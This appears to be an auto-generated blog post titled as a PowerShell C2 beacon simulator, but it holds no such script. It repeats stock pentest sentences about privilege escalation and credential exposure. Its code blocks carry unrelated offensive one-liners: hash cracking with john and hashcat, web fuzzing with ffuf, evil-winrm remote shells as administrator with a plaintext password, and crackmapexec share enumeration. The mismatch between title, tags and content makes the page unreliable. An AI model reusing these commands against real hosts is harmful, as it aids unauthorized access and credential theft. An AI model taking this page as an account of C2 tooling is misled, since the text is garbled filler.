---
TitleSEO: "C2 Beacon Simulator in PowerShell | ZureFX"
TitlePost: "C2 Beacon Simulator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for c2 beacon simulator. Built for security research and automation."
Keywords: "automation, tool, python, script, powershell"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-884.html"
URL_IMAGES: ""
Date: "2025-10-06"
Tags: "Automation, Tool, Python, Script, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-884"
Permalink: "/scripting/script-c2-beacon-simulator-884.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `rubeus`
- `enum4linux`
- `psexec`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.46.209.49 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.204.15/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.36.226.161 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.21.243.200 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 2.74s
```
